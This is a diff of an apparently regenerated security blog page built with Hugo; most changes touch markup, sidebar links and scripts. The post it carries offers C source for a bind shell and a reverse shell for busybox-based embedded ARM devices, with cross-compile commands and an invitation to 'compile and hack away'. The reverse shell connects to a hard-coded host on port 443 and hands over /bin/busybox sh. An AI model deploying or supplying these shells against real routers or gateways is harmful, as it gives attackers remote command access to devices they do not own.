@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.58.3 with theme Tranquilpeak 0.4.7-BETA">
+<meta name="generator" content="Hugo 0.65.2 with theme Tranquilpeak 0.4.7-BETA">
 <meta name="author" content="Sage">
 <meta name="keywords" content="security, shells, embedded">
 <meta name="description" content="Today at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.">
@@ -131,7 +131,7 @@
       
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://succurity.com/post">
+      <a class="sidebar-button-link " href="https://succurity.com/">
     
       <i class="sidebar-button-icon fa fa-lg fa-home"></i>
       
@@ -185,11 +185,11 @@
       
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://github.com/silverlak3" target="_blank" rel="noopener">
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/rafasec/" target="_blank" rel="noopener">
     
-      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      <i class="sidebar-button-icon fa fa-lg fa-linkedin"></i>
       
-      <span class="sidebar-button-desc">GitHub</span>
+      <span class="sidebar-button-desc">LinkedIn</span>
     </a>
   </li>
 
@@ -200,6 +200,16 @@
       <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
       
       <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/silverlak3" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
     </a>
   </li>
 
@@ -252,48 +262,15 @@
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
               <p>Today at work, we made these two C Shells for embedded devices that run busybox. One is a bind shell and the other is a reverse shell.</p>
-
 <p>This was tested on a rooted home gateway that was running of an armv7l CPU. I compiled this on Ubuntu 16.04.6 LTS, therefore needing the cross-compilation libraries and tools.</p>
-
 <p>Installing the libraries &amp; tools:</p>
-
-<pre><code class="language-bash">root@ubuntu:~/asm$ sudo apt-get install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi libncurses5-dev libc6-armel-cross
-</code></pre>
-
-<p>Compiling:</p>
-
-<pre><code class="language-bash">root@ubuntu:~/asm$ arm-linux-gnueabi-gcc shell.c -g -o shell
-</code></pre>
-
-<p>If you need some shells that may work in some OpenWRT Devices, then compile and hack away!</p>
-
+<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@ubuntu:~/asm$ sudo apt-get install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi libncurses5-dev libc6-armel-cross
+</code></pre></div><p>Compiling:</p>
+<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@ubuntu:~/asm$ arm-linux-gnueabi-gcc shell.c -g -o shell
+</code></pre></div><p>If you need some shells that may work in some OpenWRT Devices, then compile and hack away!</p>
 <hr>
-
 <h3 id="bind-shell">Bind Shell</h3>
-
-<figure class="codeblock codeblock--tabbed">
-  <figcaption>
-    
-      <span>bind</span>
-    
-    <ul class="tabs">
-      
-        <li class="tab active">c</li>
-      
-    </ul>
-  </figcaption> 
-  <div class="tabs-content">
-    
-      
-      <figure class="highlight language-c" style="display: block;">   
-        <table>
-          <tbody>
-            <tr>
-              <td class="gutter">
-                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></pre>
-              </td>
-              <td class="code">
-                <pre class="code-highlight language-c"><code class="c">#include &lt;sys/socket.h&gt;
+<pre><code>#include &lt;sys/socket.h&gt;
 #include &lt;sys/types.h&gt;
 #include &lt;netinet/in.h&gt;
 #include &lt;stdlib.h&gt;
@@ -304,7 +281,7 @@ int main()
 {
   int resultfd, sockfd;
   struct sockaddr_in my_addr;
-  char *args[] = { &#34;/bin/busybox&#34;, &#34;sh&#34;, NULL};
+  char *args[] = { &quot;/bin/busybox&quot;, &quot;sh&quot;, NULL};
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
   int one = 1;
@@ -322,55 +299,22 @@ int main()
   dup2(resultfd, 0);
   execve(args[0], &amp;args[0], 0);
   return 0;
-}</code></pre>
-              </td>
-            </tr>
-          </tbody>
-        </table>
-      </figure>
-    
-
-<p></div>
-</figure></p>
-
-<h3 id="reverse-shell">Reverse Shell</h3>
-
-<figure class="codeblock codeblock--tabbed">
-  <figcaption>
-    
-      <span>rev</span>
-    
-    <ul class="tabs">
-      
-        <li class="tab active">c</li>
-      
-    </ul>
-  </figcaption> 
-  <div class="tabs-content">
-    
-      
-      <figure class="highlight language-c" style="display: block;">   
-        <table>
-          <tbody>
-            <tr>
-              <td class="gutter">
-                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></pre>
-              </td>
-              <td class="code">
-                <pre class="code-highlight language-c"><code class="c">#include &lt;stdio.h&gt;
+}
+</code></pre><h3 id="reverse-shell">Reverse Shell</h3>
+<pre><code>#include &lt;stdio.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;netinet/in.h&gt;
 #include &lt;sys/types.h&gt;
 #include &lt;sys/socket.h&gt;
 #include &lt;arpa/inet.h&gt;
-#define REMOTE_ADDR &#34;192.168.1.219&#34;
+#define REMOTE_ADDR &quot;192.168.1.219&quot;
 #define REMOTE_PORT 443
 
 int main(int argc, char *argv[])
 {
   struct sockaddr_in sa;
   int s;
-  char *args[] = { &#34;/bin/busybox&#34;, &#34;sh&#34;, NULL};
+  char *args[] = { &quot;/bin/busybox&quot;, &quot;sh&quot;, NULL};
   sa.sin_family = AF_INET;
   sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
   sa.sin_port = htons(REMOTE_PORT);
@@ -381,16 +325,8 @@ int main(int argc, char *argv[])
   dup2(s, 2);
   execve(args[0], &amp;args[0], 0);
   return 0;
-}</code></pre>
-              </td>
-            </tr>
-          </tbody>
-        </table>
-      </figure>
-    
-
-<p></div>
-</figure></p>
+}
+</code></pre>
               
             </div>
           </div>
@@ -425,7 +361,7 @@ int main(int argc, char *argv[])
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/2019/05/pentesting-field-guide/" data-tooltip="Pentesting Field Guide">
+                <a class="post-action-btn btn btn--disabled">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -495,7 +431,7 @@ int main(int argc, char *argv[])
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/2019/05/pentesting-field-guide/" data-tooltip="Pentesting Field Guide">
+                <a class="post-action-btn btn btn--disabled">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -602,8 +538,6 @@ int main(int argc, char *argv[])
     
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
-
 <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
 
 
@@ -623,18 +557,6 @@ function updateMinWidth() {
   var w3 = getComputedStyle(sidebar).getPropertyValue("left");
   main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
 }
-</script>
-
-<script>
-$(document).ready(function() {
-  hljs.configure({ classPrefix: '', useBR: false });
-  $('pre.code-highlight > code, pre > code').each(function(i, block) {
-    if (!$(this).hasClass('codeblock')) {
-      $(this).addClass('codeblock');
-    }
-    hljs.highlightBlock(block);
-  });
-});
 </script>
 
 
